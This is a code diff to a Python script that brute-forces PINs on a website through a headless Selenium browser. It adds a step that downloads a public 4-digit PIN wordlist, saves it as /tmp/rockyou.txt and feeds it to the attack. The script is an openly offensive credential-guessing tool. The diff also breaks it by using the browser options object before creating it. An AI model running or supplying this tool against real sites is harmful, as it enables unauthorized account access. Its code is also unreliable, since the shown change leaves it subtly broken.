@@ -1,5 +1,7 @@
 import csv
 import time
+import os
+import requests
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium.webdriver.common.alert import Alert
@@ -58,8 +60,8 @@ def read_pin_data_from_txt(file_path):
 
 
 def brute_force_website(url, pin_list, batch_size=50):
-    options = Options()
     options.add_argument("--headless")  # Run the browser in headless mode
+    options = Options()
     driver = webdriver.Chrome(options=options)
 
     try:
@@ -79,13 +81,18 @@ def brute_force_website(url, pin_list, batch_size=50):
 
 
 if __name__ == "__main__":
-    choice = input("Enter 1 to use rockyou.txt or 2 to use the original CSV file: ")
+    choice = input("Enter 1 to use 4 didigt pin txt or 2 to use the your own file: ")
 
     if choice == "1":
-        file_path = 'Put filepath for rockyou here (Will fix this in another update)'
+        file_path = '/tmp/rockyou.txt'
+        url = 'https://raw.githubusercontent.com/LinuxPhreak/crunch-wordlist/master/4-digit-pin-list.txt'
+        response = requests.get(url)
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
         pin_list = read_pin_data_from_txt(file_path)
+
     elif choice == "2":
-        file_path = 'Put filepath for the csv in github here (Will fix this in another update)'
+        file_path = input('Put filepath for the csv in github here (Will fix this in another update)')
         pin_list = read_pin_data_from_csv(file_path)
     else:
         print("Invalid choice. Please enter either 1 or 2.")
